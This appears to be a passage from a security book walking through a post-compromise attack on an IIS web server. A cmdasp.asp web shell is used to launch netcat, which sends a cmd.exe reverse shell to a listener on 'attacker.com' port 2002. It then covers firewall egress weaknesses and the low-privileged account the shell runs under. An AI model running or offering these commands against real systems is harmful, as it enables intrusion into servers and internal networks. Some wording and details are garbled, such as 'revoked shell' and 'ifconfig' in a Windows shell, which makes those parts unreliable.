With nc.exe used and the capability to execute commands via cmdasp.asp, shoveling a shell back to the attacker's system is trivial. First, start a netcat listener on the attacker's system, with like so:

```
C:\>nc -l -p 2002
```

Then, use cmdasp.asp to bind a netcat shell back to the listener by entering the following command in the form and clicking Run:

```
c:\>netpub\scripts\nc.exe -v -e cmd.exe attacker.com 2002
```

And, voilà, looking at our command window running the netcat listener on port 2002 in Figure 3-4, you see a command shell has been echoed back to the attacker's system. We run ifconfig in this remote shell to illustrate the victim machine is dual-homed on what appears to be an internal network-jackpot for the attacker!

The insidious thought about the revoked shell just illustrated is the attacker can determine what port to connect. Router or firewall rules are often misconfigured from internal host on nonprivileged ports (> 1024), so this attack has a high chance of success using one of those ports if TCP 80 is the only inbound traffic allowed to the victim Web server because all preliminary steps in the attack operate over TCP 80.

One remaining remains for the attacker to bypass. Even though an interactive command shell has been obtained, it's running in the context of a low-privileged user (either the IUSR_machinename or IWAM_machename account, depending on the configuration of the server).
